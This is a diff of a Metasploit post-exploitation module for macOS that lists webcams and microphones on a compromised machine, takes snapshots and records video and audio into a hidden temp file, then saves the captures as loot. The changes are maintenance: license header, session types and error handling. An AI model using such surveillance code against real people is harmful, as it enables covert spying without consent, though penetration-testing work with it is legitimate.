@@ -1,16 +1,12 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'shellwords'
-require 'msf/core/post/osx/ruby_dl'
 
 class Metasploit3 < Msf::Post
-  include Msf::Post::Common
   include Msf::Post::File
   include Msf::Auxiliary::Report
   include Msf::Post::OSX::RubyDL
@@ -26,9 +22,9 @@ class Metasploit3 < Msf::Post
           record a webcam and mic (with the RECORD action)
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
+      'Author'        => [ 'joev'],
       'Platform'      => [ 'osx'],
-      'SessionTypes'  => [ 'shell', 'meterpreter' ],
+      'SessionTypes'  => [ 'shell' ],
       'Actions'       => [
         [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
         [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ],
@@ -42,7 +38,7 @@ class Metasploit3 < Msf::Post
         OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),
         OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
         OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
-        OptString.new('TMP_FILE', 
+        OptString.new('TMP_FILE',
           [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
         ),
         OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),
@@ -61,8 +57,8 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    fail_with("Invalid session ID selected.") if client.nil?
-    fail_with("Invalid action") if action.nil?
+    fail_with(Failure::BadConfig, "Invalid session ID selected.") if client.nil?
+    fail_with(Failure::BadConfig, "Invalid action") if action.nil?
 
     num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
     tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
@@ -108,7 +104,7 @@ class Metasploit3 < Msf::Post
                 tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
                 # store contents in file
                 title = "OSX Webcam Recording "+i.to_s
-                f = store_loot(title, "video/mov", session, contents, 
+                f = store_loot(title, "video/mov", session, contents,
                   "osx_webcam_rec#{i}.mov", title)
                 print_good "Record file captured and saved to #{f}"
                 print_status "Rolling movie file. "
@@ -119,7 +115,7 @@ class Metasploit3 < Msf::Post
             end
           end
         rescue ::Timeout::Error
-          fail_with("Client did not respond to new file request, exiting.")
+          fail_with(Failure::TimeoutExpired, "Client did not respond to new file request, exiting.")
         end
       end
     elsif action.name =~ /snap/i
@@ -148,6 +144,7 @@ class Metasploit3 < Msf::Post
 
   private
 
-  def poll_timeout; POLL_TIMEOUT; end
-  def fail_with(msg); raise msg; end
+  def poll_timeout
+    POLL_TIMEOUT
+  end
 end
